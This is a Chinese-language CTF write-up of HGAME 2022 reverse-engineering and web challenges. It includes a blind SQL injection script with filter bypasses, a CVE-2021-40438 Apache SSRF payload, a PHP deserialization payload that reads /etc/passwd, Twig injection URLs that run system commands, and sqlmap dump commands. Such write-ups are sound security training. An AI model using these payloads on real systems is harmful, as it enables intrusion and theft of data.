<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">total = c_uint32(<span class="number">0</span>)</span><br><span class="line">delta = <span class="number">0x9E3779B1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    total.value += delta</span><br><span class="line">    <span class="keyword">if</span> (total.value &gt;&gt; <span class="number">31</span> == <span class="number">0</span>):</span><br><span class="line">        total.value ^= <span class="number">0x1234567</span></span><br><span class="line"><span class="built_in">print</span>(total.value)</span><br><span class="line"><span class="comment">#3347991813</span></span><br></pre></td></tr></table></figure>

<p>第一块代码的3347991813，可由第二块代码得出，即经过32轮之后total的和。</p>
<p>将解密的16进制转为字符串maghES{e0s_H5dnu_05_etn1t5er}gni 每4位倒序</p>
<p>hgame{SEH_s0und5_50_1ntere5ting}</p>
<h6 id="upx-magic1"><a href="#upx-magic1" class="headerlink" title="upx magic1"></a>upx magic1</h6><p>这到题命令行不能脱壳，只能手动脱壳，而我手动脱壳又不太会，看了别人的wp，将文件用010打开，将3个UPX?改为UPX!,就可以通过upx -d 命令行脱壳。这个是真的学到了。</p>
<p>ida打开发现其和上一个脱upx可代码流程相同，直接用上一个脱upx题的代码运行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">key=[<span class="number">36200</span>,<span class="number">40265</span>,<span class="number">10770</span>,<span class="number">43802</span>,<span class="number">52188</span>,<span class="number">47403</span>,<span class="number">11826</span>,<span class="number">40793</span>,<span class="number">56781</span>,<span class="number">40265</span>,<span class="number">43274</span>,<span class="number">3696</span>,<span class="number">62927</span>,<span class="number">24277</span>,<span class="number">15363</span>,<span class="number">31879</span>,<span class="number">9842</span>,<span class="number">43802</span>,<span class="number">2640</span>,<span class="number">23285</span>,<span class="number">65439</span>,<span class="number">40793</span>,<span class="number">48395</span>,<span class="number">22757</span>,<span class="number">14371</span>,<span class="number">48923</span>,<span class="number">30887</span>,<span class="number">43802</span>,<span class="number">18628</span>,<span class="number">43274</span>,<span class="number">11298</span>,<span class="number">40793</span>,<span class="number">23749</span>,<span class="number">24277</span>,<span class="number">30887</span>,<span class="number">9842</span>,<span class="number">22165</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        mm=i</span><br><span class="line">        mm=mm&lt;&lt;<span class="number">8</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span>(mm&amp;<span class="number">0x8000</span>!=<span class="number">0</span>):</span><br><span class="line">                mm=(<span class="number">2</span>*mm)^<span class="number">0x1021</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm=mm*<span class="number">2</span></span><br><span class="line">        mm=mm&amp;<span class="number">0xffff</span></span><br><span class="line">        <span class="built_in">print</span>(mm,i)</span><br><span class="line">key1=[<span class="number">110</span>,<span class="number">111</span>,<span class="number">87</span>,<span class="number">95</span>,<span class="number">89</span>,<span class="number">79</span>,<span class="number">117</span>,<span class="number">126</span>,<span class="number">107</span>,<span class="number">111</span>,<span class="number">78</span>,<span class="number">119</span>,<span class="number">45</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">49</span>,<span class="number">95</span>,<span class="number">85</span>,<span class="number">80</span>,<span class="number">120</span>,<span class="number">126</span>,<span class="number">109</span>,<span class="number">65</span>,<span class="number">71</span>,<span class="number">124</span>,<span class="number">67</span>,<span class="number">95</span>,<span class="number">64</span>,<span class="number">78</span>,<span class="number">100</span>,<span class="number">126</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">67</span>,<span class="number">49</span>,<span class="number">54</span>]</span><br><span class="line">flagy=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key1)):</span><br><span class="line">    flagy+=<span class="built_in">chr</span>(key1[i])</span><br><span class="line"><span class="built_in">print</span>(flagy)</span><br><span class="line"></span><br><span class="line">flag2=<span class="string">&quot;noW_YOu~koNw-rea1_UPx~mAG|C_@Nd~crC16&quot;</span></span><br></pre></td></tr></table></figure>

<p>还是将print(mm,i)打印出来的东西与要比较的数组作比较，即可得到flag。</p>
<p>hgame{noW_YOu<del>koNw-rea1_UPx</del>mAG|C_@Nd~crC16}</p>
<h5 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h5><h6 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h6><p>（代码来源于网络）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">printable_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">burp0_url = <span class="string">&quot;http://121.43.141.153:60056/error.php?code=&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;</span>,</span><br><span class="line">             <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;</span>,</span><br><span class="line">             <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">             <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">   <span class="keyword">for</span> s <span class="keyword">in</span> printable_str:</span><br><span class="line">      <span class="comment">#payload = &quot;if(ascii(mid(database(),&#123;&#125;,1))like(&#123;&#125;),sleep(1),1)&quot;.format(i, ord(s)) #爆破数据库名pokemon</span></span><br><span class="line">      <span class="comment">#payload = &quot;if(ascii(mid((selselectect/*/**/*/group_concat(table_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.tables/*/**/*/whewherere/*/**/*/(table_schema)like(&#x27;pokemon&#x27;)),&#123;&#125;,1))like(&#123;&#125;),sleep(1),0)&quot;.format(i, ord(s))#爆破表名 errors,fllllllllaaaaaag</span></span><br><span class="line">      <span class="comment">#payload = &quot;if(ascii(mid((selselectect/*/**/*/group_concat(column_name)/*/**/*/frfromom/*/**/*/infoorrmation_schema.columns/*/**/*/whewherere/*/**/*/(table_name)like(&#x27;fllllllllaaaaaag&#x27;)),&#123;&#125;,1))like(&#123;&#125;),sleep(1),0)&quot;.format(i, ord(s))#爆破列名flag</span></span><br><span class="line">      payload = <span class="string">&quot;if(ascii(mid((selselectect/*/**/*/flag/*/**/*/frfromom/*/**/*/pokemon.fllllllllaaaaaag),&#123;&#125;,1))like(&#123;&#125;),sleep(1),1)&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(s))</span><br><span class="line">      resp = requests.get(url=burp0_url+payload, headers=burp0_headers)</span><br><span class="line">      <span class="keyword">if</span> resp.elapsed.seconds &gt; <span class="number">3</span>:</span><br><span class="line">         result += s</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;[+]&#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line"><span class="comment">#hgame&#123;C0n9r@tul4tiOn*Y0u$4r3_sq1_M4ST3R#&#125;</span></span><br></pre></td></tr></table></figure>

<p>知识点：过滤替换用双写绕过，过滤了空格（用双写/<em>/**/</em>/代替，/**/或/<em>1</em>/注释可以用作空格）通过时间盲注来注入，通过判断响应时间来决定  绕过 =: 使用 like 或者 regexp</p>
<p>官方wp</p>
<p>查询数据库： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,database() 查询表： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,group_concat(table_name)/<em>1</em>/frfromom/<em>1</em> /infoorrmation_schema.tables/<em>1</em>/whewherere/<em>1</em>/table_schema/<em>1</em>/regexp/<em>1</em>/“^pokemon $” 查询列： 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,group_concat(column_name)/<em>1</em>/frfromom/*1 */infoorrmation_schema.columns/<em>1</em>/whewherere/<em>1</em>/table_name/<em>1</em>/regexp/<em>1</em>/“^flllllll laaaaaag$” 查询 flag 404/<em>1</em>/ununionion/<em>1</em>/selselectect/<em>1</em>/111,flag/<em>1</em>/frfromom/<em>1</em>/fllllllllaaaaaag</p>
<h6 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h6><p>利用2021 年 Apache 的 mod_proxy 模块报了个 SSRF 漏洞（CVE-2021-40438），利用这个漏洞直接访问 <a target="_blank" rel="noopener" href="http://internal.host/flag">http://internal.host/flag</a> 即可拿到 flag 。</p>
<p>需要注意的是Apache 的配置文件 https-vhosts.conf </p>
<p>&lt;Location /proxy&gt;<br>      ProxyPass <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br> </p>
<p> ‘/‘ 提供静态资源服务， ‘/proxy’ 提供代理服务</p>
<p>所以构造的payload是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proxy?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http:<span class="comment">//internal.host/flag</span></span><br><span class="line"><span class="comment">#有5000个A</span></span><br></pre></td></tr></table></figure>

<p>hgame{COng@tul4ti0n~u_r3prOduced_CVE-2021-40438}</p>
<h6 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h6><p>1.网址加<a target="_blank" rel="noopener" href="http://www.zip下载源代码,根据login.php可知账号adm1n,密码1080‘/">www.zip下载源代码，根据login.php可知账号adm1n，密码1080‘</a> 可以绕过。</p>
<p>2.查看index.php可知点击后会把key，value给save.php。</p>
<p>3.由save中的encode函数可知，会将key与val用|隔开，并将val序列化存储。saveSessionData主要是获取数据同时调用encode函数将数据存储到指定位置，该文件是由登陆时产生的key进行命名的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="variable">$k</span> . <span class="string">&#x27;|&#x27;</span> . serialize(<span class="variable">$v</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$data</span> = <span class="string">&#x27;&#123;&quot;1&quot;:&quot;2&quot;&#125;&#x27;</span>;</span><br><span class="line">	<span class="variable">$b</span>=encode(json_decode(<span class="variable">$data</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>4.首先文件告诉了我们flag位置，其次分析两个function，decode函数主要是对传入的数据进行反序列化输出，与刚才save.php中的encode函数互相对应，可以看到encode函数是通过“|”分割key和value的，而decode函数则是通过“|”来进行数据判断，对“|”后来的数据进行反序列化操作。这里就存在一个问题，我们可以通过传输数据中添加“|”以此来利用docode函数的反序列化进行执行，同时查看evil.php发现了获取flag的点。<strong>存在file_get_contents，至此我们可以利用evil.php生成payload，再通过get.php进行触发，构造payload，尝试读取文件</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">new</span> Evil();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;s:4:&quot;flag&quot;;s:6:&quot;flag&#123;&#125;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;1|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:11:\&quot;/etc/passwd\&quot;;s:4:\&quot;flag\&quot;;s:6:\&quot;flag&#123;&#125;\&quot;;&#125;&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#最终构造的payload</span></span><br><span class="line">&#123;<span class="string">&quot;1|O:4:\&quot;Evil\&quot;:2:&#123;s:4:\&quot;file\&quot;;s:5:\&quot;/flag\&quot;;s:4:\&quot;flag\&quot;;s:6:\&quot;flag&#123;&#125;\&quot;;&#125;&quot;</span>:<span class="string">&quot;123&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>hgame{Uns@f3_D3seR1@liz4t1On!Is~h0rr1b1e-!n_PhP}</p>
<p>注意：需要理解各个网页的作用，save.php是提交值的，get.php是执行反序列化的，evil.php是生成payload的，必须通过一个php文件来生成，login.php只是一个图形界面。</p>
<h5 id="Level-Week3"><a href="#Level-Week3" class="headerlink" title="Level - Week3"></a>Level - Week3</h5><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><h6 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h6><p>由跳转指令，说明其存在twig的模板注入，修改/redirect.php?url=<a target="_blank" rel="noopener" href="https://www.baidu.com来进行注入./">https://www.baidu.com来进行注入。</a></p>
<p>使用/redirect.php?url=2*{[“id”]|map(“system”)}*2</p>
<p>使用/redirect.php?url=2*{[“ls /“]|map(“system”)}*2</p>
<p>cat被过滤，使用tac发现替换了含有hgame的字符串，由此尝试逆序输出：</p>
<p>/redirect.php?url=2*{[“rev /flag”]|map(“system”)}*2</p>
<p>可以得到最终的flag</p>
<p>hgame{!Tw19-S5t1<del>1s^s00O0O_inter3st1n5</del>!}</p>
<p>‘)or 1=1–+ </p>
<p>admin’) (‘union select 1 from infoorrmation_schema.tables</p>
<h6 id="LoginMe"><a href="#LoginMe" class="headerlink" title="LoginMe"></a>LoginMe</h6><p>1.查看源代码，找到hint，发现应该是sql注入。</p>
<p>2.使用sqlmap，bs抓包并保存为1.txt。</p>
<p>2.一种是sqlmap -r 1.txt –data –union-char –sql-shell</p>
<p>另一种是sqlmap -r 1.txt –batch –current-db #发现SQLite_masterdb数据库名</p>
<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb” –tables #发现uuussseeeerrrsss表名</p>
<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb”  -T “uuussseeeerrrsss” –columns #发现username和password</p>
<p>sqlmap -r 1.txt –batch –batch -D “SQLite_masterdb”  -T “uuussseeeerrrsss” “ -C “username,password” –dump  #可以查看admin密码</p>
<p>输入密码，可以得到flag。</p>
<p>hgame{a200243b5955862cf505db988688b543790e2328054962184b63f3944917f08f}</p>
<p>使用sqlmap自动化注入。</p>
<h6 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h6><h6 id="Answer’s-Windows"><a href="#Answer’s-Windows" class="headerlink" title="Answer’s Windows"></a>Answer’s Windows</h6><p>1.用 QT 写的图形界面，通过文件中的关键字符串定位到判断flag的地方：</p>
<p>2.sub_140001F90 就是加密函数 对加密函数进行分析，为 base64 加密。</p>
<p>background-image: url(:/new/prefix1/C:/Users/Answer/Desktop/right.png);为判断flag正确与否的字符串。因为它是一个正确会放出图片的显示。</p>
<p>官方wp的base64特征：</p>
<p><img src="/2022/02/20/HGAME2022%E5%A4%8D%E7%8E%B0/image-20220211212523340.png" alt="image-20220211212523340"></p>
<p>3.其中对 base64table 查看引用即可得到更改base64table的地方：IsDebuggerPresent这里有个简单的反调试，静态分析无所谓的。可以得到：</p>
<p>密文：;’&gt;B&lt;76=82@-8.@=T”@-7ZU:8*F=X2J<G>@=W^@-8.@9D2T:49U@1aa</G></p>
<p>自定义：!”#$%&amp;’()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`a 可以从字符串中找到</p>
<p>解的</p>
<p>hgame{qt_1s_s0_1nteresting_so_1s_b4se64}</p>
<p>注意因为memcmp的字符串里面会有转义字符，如果使用cyberchef之类的工 具的话是当普通字符识别的，所以将密文分辨\再转义回来。</p>
<p>这个软件太大，不容易分析。并且里面不知有base64，最重要的还是找到判断flag是否正确的字符串。</p>
<h6 id="creakme3"><a href="#creakme3" class="headerlink" title="creakme3"></a>creakme3</h6><ol>
<li><p>要反编译PowerPC 汇编，一般版本的ida无法一键f5，而ida7.5可以，所以可以下一个ida7.5。</p>
</li>
<li><p>用ida7.5反编译main函数，可知道算法：会随机生成数组到v7，再判断第二个数是否是按v7内的内容顺序排序，是则输出flag，第一个数是ascii，根据算法可得代码。这个算法又叫猴子排序。</p>
<p>ida的main函数：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x164</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome my whitegive re task! This is your flag: &quot;</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">88</span>; ++i )</span><br><span class="line">    *&amp;v7[<span class="number">4</span> * i] = <span class="built_in">rand</span>() % <span class="number">89</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">1</span>; j &lt;= <span class="number">88</span> &amp;&amp; a[<span class="number">2</span> * *&amp;v7[<span class="number">4</span> * j] + <span class="number">1</span>] &gt;= a[<span class="number">2</span> * 